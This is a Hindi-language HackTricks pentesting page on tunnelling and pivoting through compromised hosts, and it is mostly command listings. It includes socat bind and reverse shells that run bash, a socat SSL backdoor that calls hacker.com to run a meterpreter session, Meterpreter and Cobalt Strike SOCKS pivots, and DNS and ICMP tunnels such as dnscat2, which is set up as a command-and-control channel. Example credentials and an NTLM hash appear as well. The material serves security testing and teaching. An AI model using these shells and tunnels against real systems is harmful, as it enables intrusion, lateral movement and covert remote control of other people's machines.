# टनलिंग और पोर्ट फॉरवर्डिंग

<details>

<summary><strong>जानें AWS हैकिंग को शून्य से हीरो तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> के साथ!</strong></summary>

* क्या आप **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी **कंपनी को HackTricks में विज्ञापित देखना चाहते हैं**? या क्या आप **PEASS के नवीनतम संस्करण या HackTricks को PDF में डाउनलोड करने का एक्सेस चाहते हैं**? [**सब्सक्रिप्शन प्लान्स देखें**](https://github.com/sponsors/carlospolop)!
* [**द पीएस फैमिली**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष [**एनएफटीज़**](https://opensea.io/collection/the-peass-family) संग्रह।
* [**आधिकारिक PEASS और HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें।
* **शामिल हों** [**💬**](https://emojipedia.org/speech-balloon/) [**डिस्कॉर्ड ग्रुप**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम ग्रुप**](https://t.me/peass) में या **मुझे** **ट्विटर** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)** पर फॉलो** करें।
* **अपने हैकिंग ट्रिक्स साझा करें, [hacktricks रेपो](https://github.com/carlospolop/hacktricks) और [hacktricks-cloud रेपो](https://github.com/carlospolop/hacktricks-cloud) में पीआर जमा करके**।

</details>

## Nmap टिप

{% hint style="warning" %}
**ICMP** और **SYN** स्कैन को सॉक्स प्रॉक्सी के माध्यम से टनल किया नहीं जा सकता है, इसलिए हमें **पिंग डिस्कवरी को अक्षम करना** (`-Pn`) और इस काम के लिए **TCP स्कैन** (`-sT`) निर्दिष्ट करना होगा।
{% endhint %}

## **बैश**

**होस्ट -> जंप -> आंतरिकA -> आंतरिकB**
```bash
# On the jump server connect the port 3333 to the 5985
mknod backpipe p;
nc -lvnp 5985 0<backpipe | nc -lvnp 3333 1>backpipe

# On InternalA accessible from Jump and can access InternalB
## Expose port 3333 and connect it to the winrm port of InternalB
exec 3<>/dev/tcp/internalB/5985
exec 4<>/dev/tcp/Jump/3333
cat <&3 >&4 &
cat <&4 >&3 &

# From the host, you can now access InternalB from the Jump server
evil-winrm -u username -i Jump
```
## **SSH**

SSH ग्राफिकल कनेक्शन (X)
```bash
ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
```
### स्थानीय पोर्ट से पोर्ट

SSH सर्वर में नया पोर्ट खोलें --> अन्य पोर्ट
```bash
ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1 #Local port 1521 accessible in port 10521 from everywhere
```

```bash
ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1 #Remote port 1521 accessible in port 10521 from everywhere
```
### पोर्ट2पोर्ट

स्थानीय पोर्ट --> प्रभावित होस्ट (SSH) --> तीसरा\_बॉक्स:पोर्ट
```bash
ssh -i ssh_key <user>@<ip_compromised> -L <attacker_port>:<ip_victim>:<remote_port> [-p <ssh_port>] [-N -f]  #This way the terminal is still in your host
#Example
sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
```
### पोर्ट2होस्टनेट (प्रॉक्सीचेन्स)

स्थानीय पोर्ट --> प्रभावित होस्ट (SSH) --> कहीं भी
```bash
ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
```
### रिवर्स पोर्ट फॉरवर्डिंग

यह आपके होस्ट के माध्यम से एक डीएमजेड के माध्यम से आंतरिक होस्ट से रिवर्स शैल्स प्राप्त करने के लिए उपयोगी है:
```bash
ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
# Now you can send a rev to dmz_internal_ip:443 and caputure it in localhost:7000
# Note that port 443 must be open
# Also, remmeber to edit the /etc/ssh/sshd_config file on Ubuntu systems
# and change the line "GatewayPorts no" to "GatewayPorts yes"
# to be able to make ssh listen in non internal interfaces in the victim (443 in this case)
```
### VPN-Tunnel

आपको **दोनों उपकरणों में रूट अधिकार** चाहिए होते हैं (क्योंकि आप नए इंटरफेस बनाने जा रहे हैं) और sshd कॉन्फ़िग को रूट लॉगिन की अनुमति देनी चाहिए:\
`PermitRootLogin yes`\
`PermitTunnel yes`
```bash
ssh root@server -w any:any #This will create Tun interfaces in both devices
ip addr add 1.1.1.2/32 peer 1.1.1.1 dev tun0 #Client side VPN IP
ifconfig tun0 up #Activate the client side network interface
ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0 #Server side VPN IP
ifconfig tun0 up #Activate the server side network interface
```
सर्वर साइड पर फॉरवर्डिंग सक्षम करें
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
```
ग्राहक साइड पर एक नया मार्ग सेट करें
```
route add -net 10.0.0.0/16 gw 1.1.1.1
```
## SSHUTTLE

आप एक **उपनेटवर्क** के सभी **ट्रैफिक** को एक होस्ट के माध्यम से **ssh** के जरिए **टनल** कर सकते हैं।\
उदाहरण के लिए, 10.10.10.0/24 को जाने वाले सभी ट्रैफिक को फॉरवर्ड करना।
```bash
pip install sshuttle
sshuttle -r user@host 10.10.10.10/24
```
एक निजी कुंजी के साथ कनेक्ट करें
```bash
sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
# -D : Daemon mode
```
## मीटरप्रेटर

### पोर्ट2पोर्ट

स्थानीय पोर्ट --> प्रभावित होस्ट (सक्रिय सत्र) --> तीसरा\_बॉक्स:पोर्ट
```bash
# Inside a meterpreter session
portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
```
### SOCKS

SOCKS (Socket Secure) प्रोटोकॉल एक नेटवर्क प्रोटोकॉल है जो नेटवर्क ट्राफिक को टनल करने के लिए उपयोग किया जाता है। यह एक पोर्ट फॉरवर्डिंग प्रोटोकॉल है जो एक क्लाइंट और सर्वर के बीच एक सुरक्षित टनल स्थापित करता है।
```bash
background# meterpreter session
route add <IP_victim> <Netmask> <Session> # (ex: route add 10.10.10.14 255.255.255.0 8)
use auxiliary/server/socks_proxy
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
एक और तरीका:
```bash
background #meterpreter session
use post/multi/manage/autoroute
set SESSION <session_n>
set SUBNET <New_net_ip> #Ex: set SUBNET 10.1.13.0
set NETMASK <Netmask>
run
use auxiliary/server/socks_proxy
set VERSION 4a
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
## कोबाल्ट स्ट्राइक

### सॉक्स प्रॉक्सी

टीमसर्वर में एक पोर्ट खोलें जो सभी इंटरफेस में सुन रहा हो और जिसका उपयोग **बीकन के माध्यम से ट्रैफिक रूट करने के लिए** किया जा सकता है।
```bash
beacon> socks 1080
[+] started SOCKS4a server on: 1080

# Set port 1080 as proxy server in proxychains.conf
proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
```
### rPort2Port

{% hint style="warning" %}
इस मामले में, **पोर्ट बीकन होस्ट में खोला जाता है**, टीम सर्वर में नहीं, और यातायात टीम सर्वर पर भेजा जाता है और फिर वहां से निर्दिष्ट होस्ट:पोर्ट पर।
{% endhint %}
```bash
rportfwd [bind port] [forward host] [forward port]
rportfwd stop [bind port]
```
### rPort2Port स्थानीय

{% hint style="warning" %}
इस मामले में, **पोर्ट बीकन होस्ट में खोला जाता है**, टीम सर्वर में नहीं, और **ट्रैफिक को कोबाल्ट स्ट्राइक क्लाइंट** (टीम सर्वर पर नहीं) में भेजा जाता है और वहां से निर्दिष्ट होस्ट:पोर्ट पर।
{% endhint %}
```
rportfwd_local [bind port] [forward host] [forward port]
rportfwd_local stop [bind port]
```
## reGeorg

[https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeorg)

आपको एक वेब फ़ाइल टनल अपलोड करने की आवश्यकता है: ashx|aspx|js|jsp|php|php|jsp
```bash
python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp
```
## चिसल

आप इसे [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel) के रिलीज़ पेज से डाउनलोड कर सकते हैं।\
आपको **क्लाइंट और सर्वर के लिए समान संस्करण का उपयोग करना होगा**

### socks
```bash
./chisel server -p 8080 --reverse #Server -- Attacker
./chisel-x64.exe client 10.10.14.3:8080 R:socks #Client -- Victim
#And now you can use proxychains with port 1080 (default)

./chisel server -v -p 8080 --socks5 #Server -- Victim (needs to have port 8080 exposed)
./chisel client -v 10.10.10.10:8080 socks #Attacker
```
### पोर्ट फॉरवर्डिंग
```bash
./chisel_1.7.6_linux_amd64 server -p 12312 --reverse #Server -- Attacker
./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505 #Client -- Victim
```
## Rpivot

[https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)

रिवर्स टनल। टनल पीड़ित से शुरू किया जाता है।\
127.0.0.1:1080 पर एक socks4 प्रॉक्सी बनाया जाता है।
```bash
attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999
```
**NTLM प्रॉक्सी** के माध्यम से पिवट करें
```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --hashes 9b9850751be2515c8231e5189015bbe6:49ef7638d69a01f26d96ed673bf50c45
```
## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

### बाइंड शैल
```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP4:<victim_ip>:1337
```
### रिवर्स शैल
```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```
### पोर्ट से पोर्ट
```bash
socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
```
### सॉक्स के माध्यम से पोर्ट से पोर्ट टनलिंग
```bash
socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
```
### SSL सोकैट के माध्यम से मीटरप्रेटर
```bash
#Create meterpreter backdoor to port 3333 and start msfconsole listener in that port
attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,fork,verify=1 TCP:127.0.0.1:3333
```

```bash
victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
#Execute the meterpreter
```
आप एक **गैर प्रमाणीकृत प्रॉक्सी** को छलकरने के लिए इस पंक्ति को शिकार की कंसोल में आखिरी पंक्ति की बजाय चला सकते हैं:
```bash
OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
```
[https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/](https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/)

### SSL Socat टनल

**/bin/sh कंसोल**

दोनों ओर पर प्रमाणपत्र बनाएं: क्लाइंट और सर्वर
```bash
# Execute these commands on both sides
FILENAME=socatssl
openssl genrsa -out $FILENAME.key 1024
openssl req -new -key $FILENAME.key -x509 -days 3653 -out $FILENAME.crt
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
chmod 600 $FILENAME.key $FILENAME.pem
```

```bash
attacker-listener> socat OPENSSL-LISTEN:433,reuseaddr,cert=server.pem,cafile=client.crt EXEC:/bin/sh
victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.crt
```
### रिमोट पोर्ट2पोर्ट

लोकल SSH पोर्ट (22) को हमलावर होस्ट के 443 पोर्ट से कनेक्ट करें
```bash
attacker> sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr #Redirect port 2222 to port 443 in localhost
victim> while true; do socat TCP4:<attacker>:443 TCP4:127.0.0.1:22 ; done # Establish connection with the port 443 of the attacker and everything that comes from here is redirected to port 22
attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh of the victim
```
## Plink.exe

यह एक कंसोल PuTTY संस्करण की तरह है (विकल्प एक ssh client के बहुत ही समान हैं).

जैसे ही यह बाइनरी पीड़ित में निष्पादित किया जाएगा और यह एक ssh client है, हमें अपनी ssh सेवा और पोर्ट खोलने की आवश्यकता है ताकि हमें एक रिवर्स कनेक्शन हो सके। फिर, केवल स्थानीय रूप से पहुंचने योग्य पोर्ट को हमारी मशीन में एक पोर्ट पर फॉरवर्ड करने के लिए:
```bash
echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-p <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
```
## Windows netsh

### पोर्ट2पोर्ट

आपको स्थानीय व्यवस्थापक होना चाहिए (किसी भी पोर्ट के लिए)
```bash
netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp
# Example:
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=4444 connectaddress=10.10.10.10 connectport=4444
# Check the port forward was created:
netsh interface portproxy show v4tov4
# Delete port forward
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
```
## SocksOverRDP और Proxifier

आपको **सिस्टम पर RDP एक्सेस** होना चाहिए।\
डाउनलोड करें:

1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - यह टूल `Windows` की Remote Desktop Service सुविधा से `Dynamic Virtual Channels` (`DVC`) का उपयोग करता है। DVC **RDP कनेक्शन के माध्यम से पैकेट्स को टनल करने** के लिए जिम्मेदार है।
2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)

अपने क्लाइंट कंप्यूटर में इस प्रकार **`SocksOverRDP-Plugin.dll`** लोड करें:
```bash
# Load SocksOverRDP.dll using regsvr32.exe
C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
```
अब हम **RDP** का उपयोग करके **विक्टिम** से **कनेक्ट** कर सकते हैं, और हमें एक **प्रॉम्प्ट** मिलना चाहिए जिसमें कहा जाएगा कि **SocksOverRDP प्लगइन सक्षम** है, और यह **127.0.0.1:1080** पर **सुनेगा**।

**RDP** के माध्यम से **कनेक्ट** करें और विक्टिम मशीन में `SocksOverRDP-Server.exe` बाइनरी अपलोड और चलाएं:
```
C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
```
अब, अपनी मशीन (हमलावर) में पुष्टि करें कि पोर्ट 1080 सुन रहा है:
```
netstat -antb | findstr 1080
```
अब आप [**Proxifier**](https://www.proxifier.com/) **का उपयोग करके उस पोर्ट के माध्यम से ट्रैफिक को प्रॉक्सी कर सकते हैं।**

## Windows GUI Apps को प्रॉक्सीफाई करें

आप [**Proxifier**](https://www.proxifier.com/) का उपयोग करके Windows GUI apps को प्रॉक्सी के माध्यम से नेविगेट कर सकते हैं।\
**Profile -> Proxy Servers** में SOCKS सर्वर का IP और पोर्ट जोड़ें।\
**Profile -> Proxification Rules** में प्रॉक्सीफाई करने के लिए कार्यक्रम का नाम और जिन IPs को प्रॉक्सीफाई करना चाहते हैं, उनके साथ कनेक्शन जोड़ें।

## NTLM प्रॉक्सी बाईपास

पहले उल्लिखित टूल: **Rpivot**\
**OpenVPN** इसे भी बाईपास कर सकता है, जिसमें कॉन्फ़िगरेशन फ़ाइल में निम्नलिखित विकल्प सेट करें:
```bash
http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
```
### Cntlm

[http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)

यह प्रॉक्सी के खिलाफ प्रमाणीकरण करता है और स्थानीय रूप से एक पोर्ट को बाँधता है जो आप निर्दिष्ट बाह्य सेवा की ओर फॉरवर्ड किया जाता है। फिर, आप इस पोर्ट के माध्यम से अपनी पसंद का उपकरण उपयोग कर सकते हैं।\
उदाहरण के लिए जो पोर्ट 443 को फॉरवर्ड करता है।
```
Username Alice
Password P@ssw0rd
Domain CONTOSO.COM
Proxy 10.0.0.10:8080
Tunnel 2222:<attackers_machine>:443
```
अब, यदि आप उदाहरण के रूप में पीड़ित में **SSH** सेवा को पोर्ट 443 में सुनने के लिए सेट करते हैं। आप उससे आक्रमणकर्ता पोर्ट 2222 के माध्यम से कनेक्ट कर सकते हैं।\
आप एक **meterpreter** भी उपयोग कर सकते हैं जो localhost:443 से कनेक्ट करता है और हमलावर पोर्ट 2222 में सुन रहा है।

## YARP

माइक्रोसॉफ्ट द्वारा बनाया गया एक रिवर्स प्रॉक्सी। आप इसे यहाँ पा सकते हैं: [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy)

## DNS Tunneling

### Iodine

[https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)

टन एडाप्टर बनाने और DNS क्वेरी का उपयोग करके उनके बीच डेटा टनल करने के लिए दोनों सिस्टम में रूट की आवश्यकता है।
```
attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
victim> iodine -f -P P@ssw0rd tunneldomain.com -r
#You can see the victim at 1.1.1.2
```
यह टनल बहुत धीमा होगा। आप इस टनल के माध्यम से एक संकुचित SSH कनेक्शन बना सकते हैं इसका उपयोग करके:
```
ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
```
### DNSCat2

[**यहाँ से डाउनलोड करें**](https://github.com/iagox86/dnscat2)**.**

DNS के माध्यम से सीएंडसी चैनल स्थापित करता है। इसके लिए रूट विशेषाधिकार की आवश्यकता नहीं है।
```bash
attacker> ruby ./dnscat2.rb tunneldomain.com
victim> ./dnscat2 tunneldomain.com

# If using it in an internal network for a CTF:
attacker> ruby dnscat2.rb --dns host=10.10.10.10,port=53,domain=mydomain.local --no-cache
victim> ./dnscat2 --dns host=10.10.10.10,port=5353
```
#### **पॉवरशेल में**

आप [**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell) का उपयोग कर सकते हैं ताकि पॉवरशेल में dnscat2 क्लाइंट चला सकें:
```
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret somesecret -Exec cmd
```
#### **dnscat के साथ पोर्ट फॉरवर्डिंग**
```bash
session -i <sessions_id>
listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this bind 8080port in attacker host
```
#### अपने प्रॉक्सीचेन्स DNS बदलें

प्रॉक्सीचेन्स `gethostbyname` libc कॉल को अंतर्गत करता है और tcp DNS अनुरोध को socks प्रॉक्सी के माध्यम से टनल करता है। **डिफ़ॉल्ट** रूप से प्रॉक्सीचेन्स द्वारा उपयोग किया जाने वाला **DNS** सर्वर **4.2.2.2** (हार्डकोडेड) है। इसे बदलने के लिए, फ़ाइल में संपादन करें: _/usr/lib/proxychains3/proxyresolv_ और IP को बदलें। अगर आप **Windows परिवेश** में हैं तो आप **डोमेन कंट्रोलर** का IP सेट कर सकते हैं।

## गो में टनल्स

[https://github.com/hotnops/gtunnel](https://github.com/hotnops/gtunnel)

## ICMP टनलिंग

### हांस

[https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
[https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)

दोनों सिस्टम में टन एडाप्टर बनाने और ICMP इको अनुरोधों का उपयोग करके उनके बीच डेटा टनल करने के लिए रूट की आवश्यकता है।
```bash
./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
./hans -f -c <server_ip> -p P@ssw0rd -v
ping 1.1.1.100 #After a successful connection, the victim will be in the 1.1.1.100
```
### ptunnel-ng

[**यहाँ से डाउनलोड करें**](https://github.com/utoni/ptunnel-ng.git).
```bash
# Generate it
sudo ./autogen.sh

# Server -- victim (needs to be able to receive ICMP)
sudo ptunnel-ng
# Client - Attacker
sudo ptunnel-ng -p <server_ip> -l <listen_port> -r <dest_ip> -R <dest_port>
# Try to connect with SSH through ICMP tunnel
ssh -p 2222 -l user 127.0.0.1
# Create a socks proxy through the SSH connection through the ICMP tunnel
ssh -D 9050 -p 2222 -l user 127.0.0.1
```
## ngrok

**[ngrok](https://ngrok.com/) एक उपकरण है जो इंटरनेट में समाधानों को एक कमांड लाइन में उजागर करने के लिए है।**
*एक्सपोजिशन URI की तरह हैं:* **UID.ngrok.io**

### स्थापना

- एक खाता बनाएं: https://ngrok.com/signup
- क्लाइंट डाउनलोड:
```bash
tar xvzf ~/Downloads/ngrok-v3-stable-linux-amd64.tgz -C /usr/local/bin
chmod a+x ./ngrok
# Init configuration, with your token
./ngrok config edit
```
### मूल उपयोग

**दस्तावेज़ीकरण:** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/).

*यदि आवश्यक हो तो प्रमाणीकरण और TLS भी जोड़ा जा सकता है।*

#### TCP टनलिंग
```bash
# Pointing to 0.0.0.0:4444
./ngrok tcp 4444
# Example of resulting link: 0.tcp.ngrok.io:12345
# Listen (example): nc -nvlp 4444
# Remote connect (example): nc $(dig +short 0.tcp.ngrok.io) 12345
```
#### HTTP के साथ फ़ाइलों को उजागर करना
```bash
./ngrok http file:///tmp/httpbin/
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
```
#### HTTP कॉल्स को स्निफ़ करना

*XSS, SSRF, SSTI के लिए उपयोगी...*
stdout से सीधे या HTTP इंटरफेस [http://127.0.0.1:4040](http://127.0.0.1:4000) में।

#### आंतरिक HTTP सेवा का टनलिंग
```bash
./ngrok http localhost:8080 --host-header=rewrite
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
# With basic auth
./ngrok http localhost:8080 --host-header=rewrite --auth="myuser:mysuperpassword"
```
#### ngrok.yaml सरल कॉन्फ़िगरेशन उदाहरण

यह 3 टनल खोलता है:
- 2 TCP
- 1 HTTP जिसमें /tmp/httpbin/ से स्थिर फ़ाइलें प्रकट होती हैं।
```yaml
tunnels:
mytcp:
addr: 4444
proto: tcp
anothertcp:
addr: 5555
proto: tcp
httpstatic:
proto: http
addr: file:///tmp/httpbin/
```
## अन्य उपकरणों की जाँच करें

* [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
* [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)

<details>

<summary><strong>जानें AWS हैकिंग को शून्य से हीरो तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* क्या आप **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी **कंपनी को हैकट्रिक्स में विज्ञापित** देखना चाहते हैं? या क्या आप **PEASS के नवीनतम संस्करण या हैकट्रिक्स को पीडीएफ में डाउनलोड** करना चाहते हैं? [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) की जाँच करें!
* खोजें [**द पीएस फैमिली**](https://opensea.io/collection/the-peass-family), हमारा विशेष [**एनएफटीज़**](https://opensea.io/collection/the-peass-family) संग्रह
* प्राप्त करें [**आधिकारिक पीएस और हैकट्रिक्स स्वैग**](https://peass.creator-spring.com)
* **शामिल हों** [**💬**](https://emojipedia.org/speech-balloon/) [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या **मुझे** ट्विटर पर **फॉलो** करें 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **अपने हैकिंग ट्रिक्स साझा करें, [हैकट्रिक्स रेपो](https://github.com/carlospolop/hacktricks) और [हैकट्रिक्स-क्लाउड रेपो](https://github.com/carlospolop/hacktricks-cloud) में पीआर जमा करके**।

</details>
